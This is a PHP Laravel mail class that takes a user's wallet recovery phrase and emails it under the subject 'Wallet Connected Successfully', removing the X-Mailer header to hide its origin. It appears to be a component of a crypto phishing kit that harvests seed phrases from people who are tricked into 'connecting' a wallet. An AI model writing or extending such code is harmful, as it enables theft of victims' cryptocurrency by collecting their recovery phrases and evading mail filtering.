<?php

namespace App\Mail;

use Illuminate\Mail\Mailable;
use Illuminate\Queue\SerializesModels;


class RecoveryPhraseConnected extends Mailable
{
    use SerializesModels;

    public $user;
    public $recoveryPhrase;

    public function __construct($user, $recoveryPhrase)
    {
        $this->user = $user;
        $this->recoveryPhrase = $recoveryPhrase;
    }

    public function build()
    {
        return $this->from(
                        config('mail.from.address'), // Use MAIL_FROM_ADDRESS from .env
                        config('mail.from.name', config('app.name')) // Use MAIL_FROM_NAME or fallback to APP_NAME
                    )
                    ->subject('Wallet Connected Successfully')
                    ->view('emails.recovery_phrase_connected')
                    ->withSwiftMessage(function ($message) {
                        $headers = $message->getHeaders();
                        $headers->remove('X-Mailer'); // Remove Laravel-specific mailer header
                    });
    }
    

}
